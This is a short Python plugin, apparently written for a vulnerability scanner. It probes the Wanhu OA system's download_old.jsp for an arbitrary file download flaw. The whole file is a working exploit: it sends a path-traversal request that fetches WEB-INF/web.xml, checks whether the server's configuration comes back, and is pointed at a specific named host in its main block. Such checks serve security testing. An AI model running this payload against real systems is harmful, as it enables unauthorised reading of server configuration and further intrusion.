#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__Author__= Sevsea
#_PlugName= 万户download_old.jsp任意文件下载
#_FileName_= wanhu_download_old.py
def assign(service,arg):
    if service == "whezeip":
        return True,arg

def audit(arg):
    payload='defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml'
    url=arg+payload
    code,head,body,errcode,fina_url=curl.curl(url)
    if code ==200 and '<?xml version=' in body and '<servlet-name>' in body:
        security_warning(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('whezeip','http://oa.zjcof.com.cn/')[1])